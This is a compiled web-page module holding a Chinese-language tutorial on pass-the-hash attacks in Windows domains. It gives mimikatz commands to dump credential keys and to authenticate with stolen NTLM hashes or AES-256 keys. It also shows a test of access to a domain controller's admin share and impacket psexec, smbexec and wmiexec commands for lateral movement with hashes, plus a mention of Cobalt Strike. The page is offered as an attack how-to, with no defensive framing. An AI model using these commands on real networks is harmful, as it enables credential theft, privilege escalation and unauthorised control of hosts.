import{_ as e}from"./_plugin-vue_export-helper.cdc0426e.js";import{o as s,c as a,e as n}from"./app.f92b2c8f.js";const t={},i=n(`<div class="custom-container tip"><p class="custom-container-title">提示</p><p>哈希传递（Pass The Hash）攻击，直接将<strong>NTML Hash</strong>的散列值传递到其它主机，进行权限认证，获取控制权。</p><p>在域环境中，用户大都使用域账号登录，大量计算机在安装时会使用相同的本地管理员账号和密码；</p></div><h2 id="一、使用ntml-hash进行哈希传递" tabindex="-1"><a class="header-anchor" href="#一、使用ntml-hash进行哈希传递" aria-hidden="true">#</a> 一、使用NTML Hash进行哈希传递</h2><p>使用mimikatz的哈希传递功能，必须具有本地管理员权限（mimikatz需要高权限进程lsass.exe的执行权限）</p><p>1）在目标机器中以管理员权限运行mimikatz</p><div class="language-powershell line-numbers-mode" data-ext="powershell"><pre class="language-powershell"><code>mimikatz<span class="token punctuation">.</span>exe <span class="token string">&quot;privilege::debug&quot;</span> <span class="token string">&quot;sekurlsa::pth /user:Administrator /domain:hacker.org /ntlm:&lt;NTML Hash&gt;&quot;</span>
<span class="token comment">#&lt;NTML Hash&gt;为：f3a0acba8bcfb8a0896281bbfcb793ed这样的一串字符</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>2）列出目标域控C盘内容（会自动弹出一个cmd.exe）</p><div class="language-powershell line-numbers-mode" data-ext="powershell"><pre class="language-powershell"><code><span class="token function">dir</span> \\\\DC\\c$   <span class="token comment">#测试是否成功</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="二、使用aes-256进行哈希传递" tabindex="-1"><a class="header-anchor" href="#二、使用aes-256进行哈希传递" aria-hidden="true">#</a> 二、使用AES-256进行哈希传递</h2><p>当系统安装了<code>KB2871997</code>补丁，将无法使用常规的哈希传递攻击；</p><p>但是SID为500的Admintrator用户，依然可以使用哈希传递，或者使用AES-256进行哈希传递。</p><p>1）抓取AES-256密钥</p><div class="language-powershell line-numbers-mode" data-ext="powershell"><pre class="language-powershell"><code>mimikatz<span class="token punctuation">.</span>exe <span class="token string">&quot;privilege::debug&quot;</span> <span class="token string">&quot;sekurlsa::ekeys&quot;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>2）管理员权限运行mimikatz</p><div class="language-powershell line-numbers-mode" data-ext="powershell"><pre class="language-powershell"><code>mimikatz <span class="token string">&quot;privilege::debug&quot;</span> <span class="token string">&quot;sekurlsa::pth /user:Administrator /domain:hacker.org /aes256:&lt;AES-256密钥&gt;&quot;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="三、不使用mimikatz进行哈希传递" tabindex="-1"><a class="header-anchor" href="#三、不使用mimikatz进行哈希传递" aria-hidden="true">#</a> 三、不使用mimikatz进行哈希传递</h2><p>1、目标能出网的话我一般直接用CS去横向传递Hash上线主机</p><p>2、使用impacket软件包</p><div class="language-powershell line-numbers-mode" data-ext="powershell"><pre class="language-powershell"><code>psexec<span class="token punctuation">.</span>py <span class="token operator">-</span>hashes :&lt;hash&gt; 域<span class="token operator">/</span>域用户名@目标IP
smbexec<span class="token punctuation">.</span>py <span class="token operator">-</span>hashes :&lt;hash&gt; 域<span class="token operator">/</span>域用户名@目标IP
wmiexec<span class="token punctuation">.</span>py <span class="token operator">-</span>hashes :&lt;hash&gt; 域<span class="token operator">/</span>域用户名r@目标IP whoami
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,18),l=[i];function r(o,p){return s(),a("div",null,l)}const u=e(t,[["render",r],["__file","哈希传递攻击.html.vue"]]);export{u as default};
